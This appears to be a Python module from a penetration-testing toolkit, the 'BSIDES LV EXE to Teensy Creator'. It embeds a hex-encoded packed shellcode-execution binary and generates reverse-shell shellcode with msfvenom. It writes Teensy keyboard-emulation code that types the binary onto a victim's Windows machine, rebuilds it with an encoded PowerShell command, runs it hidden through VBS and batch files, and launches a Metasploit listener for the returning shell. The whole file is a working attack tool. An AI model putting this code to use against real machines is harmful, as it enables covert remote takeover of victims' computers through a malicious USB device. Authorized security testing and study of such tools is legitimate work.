#!/usr/bin/python
from __future__ import print_function
import binascii,base64,sys,os,random,string,subprocess,socket
from src.core.setcore import *
from src.core.dictionaries import *
from src.core.menu.text import *

try:
    input = raw_input
except NameError:
    pass

################################################################################################
#
#                               BSIDES LV EXE to Teensy Creator
#
#                                by Josh Kelley (@winfang98)
#                                Dave Kennedy (@hackingdave)
#
################################################################################################

################################################################################################
################################################################################################

#
# metasploit_path here
#
msf_path = meta_path() + "msfconsole"
if msf_path == "msfconsole": msf_path = "/usr/bin/msfconsole"

################################################################
#
# shell exec payload hex format below packed via upx
#
# shellcodeexec was converted to hex via binascii.hexlify:
#
# import binascii
# fileopen = file("shellcodeexec.exe", "wb")
# data = fileopen.read()
# data = binascii.hexlify(data)
# filewrite = file("hex.txt", "w")
# filewrite.write(data)
# filewrite.close()
#
################################################################
#
shell_exec = "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000ad632ba8e90245fbe90245fbe90245fbcec43efbeb0245fbcec42bfbe80245fbcec438fbe80245fbcec428fbfd0245fb2a0d18fbea0245fbe90244fbc20245fbcec434fbe80245fbcec43dfbe80245fb52696368e90245fb0000000000000000504500004c010300b1aca94d0000000000000000e00003010b010800001000000010000000500000a0680000006000000070000000004000001000000002000004000000000000000400000000000000008000000010000000000000030000000000100000100000000010000010000000000000100000000000000000000000b0710000d800000000700000b00100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000306a00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000500000001000000000000000040000000000000000000000000000800000e055505831000000000010000000600000000c000000040000000000000000000000000000400000e02e7273726300000000100000007000000004000000100000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e303400555058210d0902095049aa36ebb85e29604400009a0800000016000026010060d9eefeff837c2404027d1468d8204000ff15a405596aff08a0ffbffdbf8b442408ff7004e8010000281400ebe9558bec518b45088d5001f7dbffff8a084084c975f956572bc26a408bf0680010238d4601506a4376b3fd5d043a56ff75088bf8570ca883c40c52dd777bf78d45fc1d57688b10106a0027081a50b5eddf6c06005f33c05ec9c36a0885210cfbdbbbdf6f06688365fc006affd0eb071b40c38b65e8c740edffb56dfe98ff0d1fadc204003b0d00302dedc77efb7502f3c3e91103726855153b051ba1603309be5f77f7c704242c1eff355c0ca30a681c0420763ff67b181915989b1485c0a3280f7d081ff276d77f3e0476598810687833db89bd155afb5dfc64a118df8f0b0be4bf74bffdaedb505356db303f3bc374193bc6ec33f6468975ed76dddbe4eb38e803005a341aebda14a1702df6ecce2d200a6a1f5ceb3b1274fbeceef7752c89350968c82b68c0206f6059591a6de70e767417ecb8ff76dd02802b20df87b934a34d1b68bc34b45bebbecb5ac7051a022e39a28e53bccddd759e381d391d8016a26806e16bff3d1cee5e0a536a02532013a1146cafb0fb8b0d882b89012c0d0520bba1dd8c18e8ddfd85bfa330304cc283f1e1247037501e45ec8be4b6c3f6fe09894de050515adb59a716e06b062bc42d382f07908b8399ed17c275060d94e1a1dfda47782ad1c366813dbd0c4d5a7404b7dfee0be4eb51a13c0c81b81250450575eb3bb7e3f70fb7881812f90b90741b07ee75d4d976ffee83b884150e76cb33c93988f80aeb1112747bffee19b8e80a0f95c18bc16a01a38f7ec71f1f6654e350ec59a378206e74bfef7c33194cd60d680b897a1548617b47c60d64a1440c276c47beb9ef062d04070d833d1451840c681117fb6ddffb3f5851cde419106b750968daf06def7c16d3c33310ce011078bb3b6e4981ec282aa340315e0d3c057c7e8557b105250535303d2c72e458db668c57060d4c1d286f8e1c39052425202d1c9c8f0550f3d856308156440704a3481bedef257a08a3540f85e0fc8d2990aebd82739984fb1c290dd8b6d46d1338050953c0093c1d63bb9fca005d8985d832a1040adc15dc6633cc1ca388104fc6fa78facfa459cb208ed042241db6f09e553d20170823684beea4ed5b1b28f22c06eeff31a4adc3259c887a986b2cfcfba173868b356c48d659894546f8f461732d420c4b336843eb61aecd5e8fa307b6591f2e2827d668836c0a78e0ed8f03dbb67deee450352ab012dc0ae4545036da1322e875e009d51ce1211811fa88d41231bc713663dc8b66aad0ff74245d7afb0f00047cf7d81bc0035948c3f9b868357debd7b0bf043bc7fb730f8b065302c9f3fd6faa83c6043bf772f15f5e237070a37d6c03ccff8c534c60f98cbfa36339f503218b413c03c18138f0c78d5b63f0bd187818ed0f94bdb61b98352f0094048b4825c8ffdf5a970e41148605710633d285f6578d44081876ffffb6c01e8bcd141d0c3bf972098b580803d93bfb720c833cb0b5ffc20183c0283bd672e660775b66b85fdfd381ba6252ff7c1c3d6b6c010376d55010ac8d07e1f61f2b8b4024c1e81ff7bce0012deb206cbb994efd10a33d053fc0a2878694c0a5e3847651d8dedc258005bb68c5160664abb0d9fec05d5c10896c038d2be068dfc6304f6f313e33c5508947b0106c5ba2f861fc4dc2f82bb5edbdd1f064a337644d09300a037b78f7595fce8be55d51a510038587d7c168ba656850c6bceac335688518920e2413db3bd7b780965616c8d7dd0d56a1e0e07b0010c20c97856e2176939d83ec109020f80358f8050a2450bf4ee640bbccbb1616b819de620d85f70910a31e3ab69f18eb60569df8d63cce75b26db6d6c0ba0b0c33f00710029d8b0c14c527183c0b345a3bf4330c110c1fbe2bfddbbb4f59eb0b85f30a8bc6c1e0100bf0fe7be1e96fe3f7ce35605e5f5b2dac491919191b5c05606470559919197478002fa06454c91057cb5e16e98a120bc8ffffffabe052756e3a0a097368656c6c636f646565786563203c6156e8fdff6c7068616e756d657269632d656e1843233728eb4e3e0a3f489477a361116060213e00f27c8f16582ad707d009bbfb820f3ac74e12401f2eec1790cc0716151fd8856d6a40385e4c161faa32da70a233a610211100d9a80010ecbb68d5b119bf44ff005555161d2701148caa2a1b004a46559501bc81a86004b7ffff2fbd0157616974466f7253696e676c654f626a656374145669ebfedbff727475616c416c6c6f630d437265617465546806640dd8b76f7f4765744375720b6e7450721d6573734914fb0f364b26135469636b436f756e52acbd6dbf51756572795003666b6d616e3716b5f6df5a0e1849734465627567670b4f6fdbdbb74d652b5339556e682564916445781516fb6f2b7074696f6e46696c2f196bdb96b2991254176dd9bdd6ba3799114975d66b408273cdb9f66d70612e47517f77556e59c25a51221b5c78ddb7ed537973186dd36d654173736509767b6858416d4844495ff66a7521f66ddbfd5f666469760d5f700263616d6f64650dc582820d660b816ead4db8116f690119f6366170cdb560df22747970650f49bab8f65ee1b56805212b8f1af92c58c3b7096e657869265f130f4618b296545865225fdddcd9133072348f6e1820766fd05a6cbbde5f7760730f183122fc6cbb216c6682730d66696774c95d6bafe16308943263556dafbd37b05f0c910bd2f21bec10da58636c8c5f936307dbd016065f4474cf8b72676275cf82fd616d736722057072b4668d7761a10740721e70793983196d0bc65f641ac26fafb918ff0680244c010400b1aca94dcd9eedda7fe00003010b01080802000a136c136d67df33e100200d400b020204056bc382330750270d0b36d6000305100f07836dc7920600f421033c52acf65724053210210000402fb6bb30102e56787407d2079077b3810d08c400ea602e726eb0868564d5611305fb0603f76cb7b00c2777402e260084f4b7297bc2301b001227c04f7372950d36d86300eb4027144f00d07ebf04e4220dba42030000000000000048ff00000000000060be006040008dbe00b0ffff5783cdffeb109090909090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b9230000008a07472ce83c0177f7803f0175f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe004000008b0709c0743c8b5f048d8430b061000001f35083c708ff96ec610000958a074708c074dc89f95748f2ae55ff96f061000009c07407890383c304ebe1ff96006200008baef46100008dbe00f0ffffbb0010000050546a045357ffd58d87ff01000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e93ca9ffff48000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000304000602140000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010001000000300000800000000000000000040000000000010009040000480000005c70000052010000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010720000ec7100000000000000000000000000001d7200000872000000000000000000000000000000000000000000002872000036720000467200005672000064720000727200000000000080720000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000004578697450726f6365737300000065786974000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
#
#########################################
#
# shell exec payload hex format above
#
#########################################

# print main stuff for the application
print("""
********************************************************************
        BSIDES Las Vegas ----  EXE to Teensy Creator
********************************************************************

Written by: Josh Kelley (@winfang98) and Dave Kennedy (ReL1K, @HackingDave)

This program will take shellexeccode which is converted to hexadecimal and
place it onto a victim machine through hex to binary conversion via powershell.

After the conversion takes place, Alphanumeric shellcode will then be injected
straight into memory and the stager created and shot back to you.
""")

# if we dont detect metasploit
if not os.path.isfile(msf_path): sys.exit("\n[!] Your no gangster... Metasploit not detected, check set_config.\n")

# if we hit here we are good since msfvenom is installed
###################################################
#        USER INPUT: SHOW PAYLOAD MENU 2          #
###################################################

show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
payload=(input(setprompt(["14"], "")))

if payload == "exit" :
    exit_set()

# if its default then select meterpreter
if payload == "" : payload="2"

# assign the right payload
payload=ms_payload(payload)

# if we're downloading and executing a file
url = ""
if payload == "windows/download_exec":
    url = input(setprompt(["6"], "The URL with the payload to download and execute"))
    url = "set URL " + url

#
# grab the interface ip address
#
ipaddr = grab_ipaddress()


# try except for Keyboard Interrupts
try:
    # grab port number
    while 1:
        port = input(setprompt(["6"], "Port to listen on [443]"))
        # assign port if enter is specified
        if port == "": port = 443
        try:
            # try to grab integer port
            port = int(port)
            # if we aren't using a valid port
            if port >= 65535:
                # trigger exception
                port = "dfds"
                port = int(port)
            break

        # if we bomb out then loop through again
        except:
            print_error("[!] Not a valid port number, try again.")
            # pass through
            pass

# except keyboardintterupts here
except KeyboardInterrupt:
    print("""
    .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
    |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
    `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
                                               disabled.\n""")

    sys.exit("\n[!] Control-C detected. Bombing out. Later Gangster...\n\n")

print_status("Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim...")
# grab msfvenom alphanumeric shellcode to be inserted into shellexec
proc = subprocess.Popen("%smsfvenom -p %s EXITFUNC=thread LHOST=%s LPORT=%s %s --format raw -e x86/alpha_mixed BufferRegister=EAX" % (meta_path(),payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
# read in stdout which will be our alphanumeric shellcode
alpha_payload = proc.stdout.read()
# generate a random filename this is going to be needed to read 150 bytes in at a time
random_filename = generate_random_string(10,15)
# prep a file to write
filewrite = file(random_filename, "wb")
# write the hex to random file
filewrite.write(shell_exec)
# close it
filewrite.close()
# open up the random file
fileopen=file(random_filename, "r")
# base counter will be used for the const char RevShell_counter
counter = 0
# space to write out per line in the teensy ino file
space = 50
# rev counter is used for the second writeout
rev_counter = 0
# here we begin the code
output_variable = "/* Teensy Hex to File Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K) - file ext changed to .ino and prog_char & PROGMEM modified */\n#include <avr/pgmspace.h>\n"

# powershell command here, needs to be unicoded then base64 in order to use encodedcommand
powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))

########################################################################################################################################################################################################
#
# there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
# in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
#
########################################################################################################################################################################################################

# blank command will store our fixed unicode variable
blank_command = ""
# loop through each character and insert null byte
for char in powershell_command:
    # insert the nullbyte
    blank_command += char + "\x00"

# assign powershell command as the new one
powershell_command = blank_command
# base64 encode the powershell command
powershell_command = base64.b64encode(powershell_command)

# while true
while 1:
    # read 150 bytes in at a time
    reading_hex = fileopen.read(space).rstrip()
    # if its blank then break out of loop
    if reading_hex == "": break
    # write out counter and hex
    output_variable += 'const char RevShell_%s[] = "%s";\n' % (counter,reading_hex)
    # increase counter
    counter = counter +1

# write out the rest
output_variable += "const char *exploit[] = {\n"
# while rev_counter doesn't equal regular counter
while rev_counter != counter:
    output_variable+="RevShell_%s" % rev_counter
    # incremenet counter
    rev_counter = rev_counter + 1
    if rev_counter == counter:
        # if its equal that means we
        # are done and need to append a };
        output_variable+="};\n"
    if rev_counter != counter:
        # if we don't equal, keep going
        output_variable+=",\n"

# vbs filename
vbs = generate_random_string(10,15) + ".vbs"
# .batch filename
bat = generate_random_string(10,15) + ".bat"

# write the rest of the teensy code
output_variable += ("""
char buffer[55];
int ledPin = 11;

void setup() {
  pinMode(ledPin, OUTPUT);
}
void loop()
{
  BlinkFast(2);
  delay(5000);
  CommandAtRunBar("cmd /c echo 0 > %%TEMP%%\\\\%s");
  delay(750);
  CommandAtRunBar("notepad %%TEMP%%\\\\%s");
  delay(1000);
  // Delete the 0
  Keyboard.set_key1(KEY_DELETE);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  // Write the binary to the notepad file
  int i;
  for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
    strcpy_P(buffer, (char*)pgm_read_word(&(exploit[i])));
    Keyboard.print(buffer);
    delay(80);
  }
  // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
  delay(5000);
  CtrlS();
  delay(2000);
  AltF4();
  delay(5000);
  // Cannot pass entire encoded command because of the start run length
  // run through cmd
  CommandAtRunBar("cmd");
  delay(1000);
  Keyboard.println("powershell -EncodedCommand %s");
  delay(4000);
  Keyboard.println("echo Set WshShell = CreateObject(\\"WScript.Shell\\") > %%TEMP%%\\\\%s");
  Keyboard.println("echo WshShell.Run chr(34) ^& \\"%%TEMP%%\\\\%s\\" ^& Chr(34), 0 >> %%TEMP%%\\\\%s");
  Keyboard.println("echo Set WshShell = Nothing >> %%TEMP%%\\\\%s");
  Keyboard.println("echo %%TEMP%%\\\\%s.exe %s > %%TEMP%%\\\\%s");
  Keyboard.println("wscript %%TEMP%%\\\\%s");
  delay(1000);
  Keyboard.println("exit");
  delay(9000000);
}
void BlinkFast(int BlinkRate){
  int BlinkCounter=0;
  for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){
    digitalWrite(ledPin, HIGH);
    delay(80);
    digitalWrite(ledPin, LOW);
    delay(80);
  }
}
void AltF4(){
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_F4);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
void CtrlS(){
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.set_key1(KEY_S);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
// Taken from IronGeek
void CommandAtRunBar(char *SomeCommand){
  Keyboard.set_modifier(128);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void PRES(int KeyCode){
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_key1(0);
Keyboard.send_now();
}
void SPRE(int KeyCode){
Keyboard.set_modifier(MODIFIERKEY_SHIFT);
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}""" % (random_filename,random_filename,powershell_command,vbs,bat,vbs,vbs,random_filename,alpha_payload,bat,vbs))
# delete temporary file
subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" % (random_filename), shell=True).wait()
if not os.path.isdir(userconfigpath + "reports"): os.makedirs(userconfigpath + "reports")
print_status("Binary to Teensy file exported as %sreports/binary2teensy" % (userconfigpath))
# write the teensy.ino file out
filewrite = file(userconfigpath + "reports/binary2teensy.ino", "w")
# write the teensy.ino file out
filewrite.write(output_variable)
# close the file
filewrite.close()
print_status("Generating a listener...")
# create our metasploit answer file
filewrite = file(userconfigpath + "answer.txt", "w")
filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\n%s\nexploit -j" % (payload,ipaddr,port,url))
filewrite.close()
# spawn a multi/handler listener
subprocess.Popen("msfconsole -r %sanswer.txt" % (userconfigpath), shell=True).wait()
print_status("[*] Housekeeping old files...")
# if our answer file is still there (which it should be), then remove it
if os.path.isfile(userconfigpath + "answer.txt"):
    # remove the old file, no longer used once we've exited
    subprocess.Popen("rm " + userconfigpath + "answer.txt", shell=True).wait()

